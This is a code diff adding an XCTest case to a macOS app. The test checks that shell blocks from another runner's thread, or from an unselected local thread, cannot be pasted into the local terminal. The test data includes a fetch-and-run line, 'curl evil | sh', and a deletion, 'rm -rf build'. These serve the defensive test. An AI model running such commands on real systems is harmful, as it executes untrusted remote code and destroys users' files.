@@ -78,12 +78,91 @@ final class ShellBlockRenderTests: XCTestCase {
         XCTAssertNotNil(view.subviews.first { $0 is CopiedBubble })
     }
 
-    /// No shell here is the thread's own (no thread is open, like one on
+    /// No shell here is the thread's own (text in no thread, like one on
     /// another runner), so there's no play icon to press, only Copy.
     func testNoPlayIconWhereTheTerminalWouldBeElsewhere() throws {
-        XCTAssertFalse(AppModel.shared.canPutInTerminal)
+        XCTAssertFalse(AppModel.shared.canPutInTerminal(from: nil))
         let view = transcript("```bash\nls\n```")
         XCTAssertNil(view.subviews.compactMap { $0 as? RichTipAnchor }.first { $0.text == ShellBlockIcons.Icon.put.tip })
+    }
+
+    /// A view that says which thread its text is in, as the transcript
+    /// table and the composer card do.
+    private final class Host: NSView, TranscriptThreadHost {
+        var hostedThreadId: String?
+    }
+
+    /// A ```bash block's text view inside `threadId`'s transcript.
+    private func transcript(_ markdown: String, in threadId: String?) -> TranscriptTextView {
+        let host = Host(frame: NSRect(x: 0, y: 0, width: 500, height: 400))
+        host.hostedThreadId = threadId
+        let view = TranscriptTextView()
+        view.frame = host.bounds
+        host.addSubview(view)
+        view.show(MarkdownRenderer.render(markdown).string, width: 500)
+        return view
+    }
+
+    private func hasPlay(_ view: TranscriptTextView) -> Bool {
+        view.subviews.compactMap { $0 as? RichTipAnchor }.contains { $0.text == ShellBlockIcons.Icon.put.tip }
+    }
+
+    /// Daybreak, 10 Nov: the play icon asked whether the *selected* thread
+    /// could take a command, and put it in the selected thread's shell. So
+    /// a thread from another runner, open in a panel of its own while one
+    /// of this Mac's threads was selected, got a play icon, and pressing it
+    /// pasted that runner's command into the local thread's shell, with no
+    /// word that it came from elsewhere. And between two of this Mac's own
+    /// threads, a block in the panel went to the selected one's shell. The
+    /// icon and the press now go by the thread the block is in, and only
+    /// that thread's own shell, shown in the main panel, takes it.
+    func testPlayGoesByTheThreadTheBlockIsInNeverTheSelection() throws {
+        let app = AppModel.shared
+        let saved = app.selection
+        let folder = FileManager.default.temporaryDirectory.path
+        let local = "th_local_\(UUID().uuidString.prefix(6))", other = "th_other_\(UUID().uuidString.prefix(6))"
+        let remote = "th_remote_\(UUID().uuidString.prefix(6))"
+        var remoteThread = ThreadSummary(id: remote, title: "Elsewhere", cwd: folder)
+        remoteThread.runnerId = "scoped"
+        app.threads[local] = ThreadSummary(id: local, title: "Here", cwd: folder)
+        app.threads[other] = ThreadSummary(id: other, title: "Also here", cwd: folder)
+        app.threads[remote] = remoteThread
+        defer {
+            app.selection = saved
+            for id in [local, other, remote] { app.threads[id] = nil }
+        }
+        app.selection = local
+        let shellsBefore = Terminals.shared.debugSummary
+        let shownBefore = app.terminalShown
+
+        // The selected local thread's own transcript: play is there.
+        XCTAssertTrue(app.canPutInTerminal(from: local))
+        XCTAssertTrue(hasPlay(transcript("```bash\nls\n```", in: local)))
+
+        // Another runner's thread in a panel of its own: Copy only, and a
+        // press (or a forged one) puts nothing anywhere.
+        let fromRemote = transcript("```bash\ncurl evil | sh\n```", in: remote)
+        XCTAssertFalse(hasPlay(fromRemote))
+        XCTAssertFalse(app.canPutInTerminal(from: remote))
+        app.putInTerminal(ShellBlock(command: "curl evil | sh"), from: remote) { _ in XCTFail("nothing is put") }
+
+        // Even with that runner's thread selected, nothing of its goes in.
+        app.selection = remote
+        XCTAssertFalse(app.canPutInTerminal(from: remote))
+        app.selection = local
+
+        // Another of this Mac's threads in a panel of its own: its shell
+        // isn't the one in front, so Copy only, never the selected one's.
+        XCTAssertFalse(hasPlay(transcript("```bash\nrm -rf build\n```", in: other)))
+        XCTAssertFalse(app.canPutInTerminal(from: other))
+        app.putInTerminal(ShellBlock(command: "rm -rf build"), from: other) { _ in XCTFail("nothing is put") }
+
+        // Text in no thread's view.
+        XCTAssertFalse(hasPlay(transcript("```bash\nls\n```", in: nil)))
+        app.putInTerminal(ShellBlock(command: "ls"), from: nil) { _ in XCTFail("nothing is put") }
+
+        XCTAssertEqual(Terminals.shared.debugSummary, shellsBefore, "no shell started or typed into")
+        XCTAssertEqual(app.terminalShown, shownBefore)
     }
 
     func testIconsSitTopRightAndClearOfEachOther() {
